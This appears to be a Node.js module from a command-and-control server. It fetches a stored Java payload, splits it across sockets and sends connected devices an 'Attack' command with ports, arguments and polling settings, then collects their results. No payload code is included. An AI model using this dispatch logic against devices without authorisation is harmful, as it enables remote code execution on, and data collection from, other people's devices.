const payloads = require('../database/models/payload');
const attacks = require('../database/models/attackResult');
const socketManager = require('./socketManager');
const codeUtil = require('../utils/codeUtil');
const messageParser = require('../utils/messageParser');


async function triggerDevices(devices, payload_id, payloadArgs, pollingRate, num) {
    return new Promise((resolve, reject) => {
        payloads.readOneById(payload_id)
            .then( (payload) => {
                const javaCode = payload.content;
                const javaCodeMinified = codeUtil.minifyJavaCode(javaCode);
                const javaPieces = codeUtil.splitJavaCode(javaCodeMinified);

                const codeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
                console.log(codeSenderPorts);

                for (let i = 0; i < javaPieces.length; i++) {
                    socketManager.openNewSocketCodeSender(codeSenderPorts[i], javaPieces[i], devices.length);
                }

                const promises = [];

                devices.forEach(device => {
                    const devicePort = device.device.port;

                    const collectorPort = socketManager.requireFreeCollectorPort();

                    socketManager.writeOnSocketMainByPort(devicePort, "Attack");
                    socketManager.writeOnSocketMainByPort(devicePort, "Servers: " + messageParser.codeSenderStringBuilder(codeSenderPorts));
                    socketManager.writeOnSocketMainByPort(devicePort, 'Collector: ' + messageParser.collectorStringBuilder(collectorPort));
                    socketManager.writeOnSocketMainByPort(devicePort, 'Result Type: ' +  payload.resultType);
                    socketManager.writeOnSocketMainByPort(devicePort, 'Arg: ' +  payloadArgs);
                    socketManager.writeOnSocketMainByPort(devicePort, 'Polling: ' +  pollingRate);
                    socketManager.writeOnSocketMainByPort(devicePort, 'Reps: ' +  num);

                    promises.push(socketManager.openSocketCollectorAndWaitForResult(collectorPort));
                });

                Promise.all(promises)
                    .then(results => {
                        const attacks = [];
                        results.forEach(collectedString => {
                            const newAttack = messageParser.parseAttack(null, payload, collectedString);

                            attacks.push(newAttack);
                        })

                        resolve(attacks);
                    })
                    .catch( error => {
                        reject(error);
                    })
                    .finally(() => {
                        //TODO
                        //socketManager.releaseCollectorPort(randomPortCollector);
                        //socketManager.releaseCodeSenderPorts(randomCodeSenderPorts);
                    });
            })
            .catch((error) => {
                console.log(error);
                reject({status: 404, message: 'payload not found'})
            });
    });
}

module.exports = {
    triggerDevices
}